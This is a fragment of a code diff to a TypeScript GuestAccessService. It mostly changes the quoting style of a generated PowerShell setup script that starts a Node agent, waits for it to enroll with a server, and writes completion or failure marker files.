-      "Start-Process -FilePath $nodeExe -ArgumentList @(\"`\"$mainJs`\"\") -WorkingDirectory $workDir -WindowStyle Hidden",
+      'Start-Process -FilePath $nodeExe -ArgumentList @("`"$mainJs`"") -WorkingDirectory $workDir -WindowStyle Hidden',
       "Write-ProgressStatus 88 'Connecting'",
       "$stateFile = Join-Path $DataDir 'state.json'",
-      "$enrolled = $false",
-      "for ($i = 0; $i -lt 45; $i++) {",
-      "  Start-Sleep -Seconds 2",
-      "  $connectPct = [Math]::Min(98, 88 + [int]($i / 2))",
+      '$enrolled = $false',
+      'for ($i = 0; $i -lt 45; $i++) {',
+      '  Start-Sleep -Seconds 2',
+      '  $connectPct = [Math]::Min(98, 88 + [int]($i / 2))',
       "  Write-ProgressStatus $connectPct 'Connecting'",
-      "  if (Test-Path $stateFile) {",
-      "    try {",
-      "      $st = Get-Content -LiteralPath $stateFile -Raw | ConvertFrom-Json",
-      "      if ($st.deviceId) { $enrolled = $true; Log (\"Enrolled deviceId=$($st.deviceId)\"); break }",
-      "    } catch {}",
-      "  }",
-      "  if (($i % 5) -eq 4) { Log \"Waiting for enrollment... ($i)\" }",
-      "}",
-      "if (-not $enrolled) {",
-      "  if (Test-Path $LogFile) { Get-Content $LogFile -Tail 80 | ForEach-Object { Log $_ } }",
+      '  if (Test-Path $stateFile) {',
+      '    try {',
+      '      $st = Get-Content -LiteralPath $stateFile -Raw | ConvertFrom-Json',
+      '      if ($st.deviceId) { $enrolled = $true; Log ("Enrolled deviceId=$($st.deviceId)"); break }',
+      '    } catch {}',
+      '  }',
+      '  if (($i % 5) -eq 4) { Log "Waiting for enrollment... ($i)" }',
+      '}',
+      'if (-not $enrolled) {',
+      '  if (Test-Path $LogFile) { Get-Content $LogFile -Tail 80 | ForEach-Object { Log $_ } }',
       "  throw 'Enrollment failed — agent did not register with the server. Check the PC can reach the API URL.'",
-      "}",
+      '}',
       "Write-ProgressStatus 100 'Complete'",
       "Log 'Setup complete'",
       "[IO.File]::WriteAllText((Join-Path $DataDir 'setup.complete'), (Get-Date -Format o))",
-      "[IO.File]::WriteAllText($PublicComplete, (Get-Date -Format o))",
-      "} catch {",
-      "  $errMsg = $_.Exception.Message",
-      "  try { Log (\"SETUP FAILED: $errMsg\") } catch {}",
+      '[IO.File]::WriteAllText($PublicComplete, (Get-Date -Format o))',
+      '} catch {',
+      '  $errMsg = $_.Exception.Message',
+      '  try { Log ("SETUP FAILED: $errMsg") } catch {}',
       "  try { [IO.File]::WriteAllText((Join-Path $DataDir 'setup.failed'), $errMsg) } catch {}",
-      "  try { [IO.File]::WriteAllText($PublicFailed, $errMsg) } catch {}",
-      "  throw",
-      "}",
+      '  try { [IO.File]::WriteAllText($PublicFailed, $errMsg) } catch {}',
+      '  throw',
+      '}',
     ].join('\n');
   }
 
@@ -911,5 +1033,4 @@ export class GuestAccessService {
       wsUrl: wsBase,
     });
   }
-
 }
